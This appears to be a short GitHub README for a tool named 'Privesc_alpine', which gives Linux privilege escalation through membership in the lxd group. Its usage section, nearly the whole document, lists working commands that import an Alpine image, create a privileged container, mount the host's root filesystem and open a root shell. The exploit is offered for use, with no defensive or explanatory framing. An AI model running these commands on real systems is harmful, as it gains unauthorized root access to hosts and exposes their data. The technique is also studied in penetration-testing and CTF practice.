# Privesc_alpine
This alpine for linux privesc. Its works when the user is part of lxd group.

# Usage:
```
unzip alpine.zip
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
```
![image](https://github.com/H3EXX/Privesc_alpine/assets/111686217/6d54849c-d9da-4897-a768-41e2507f73eb)

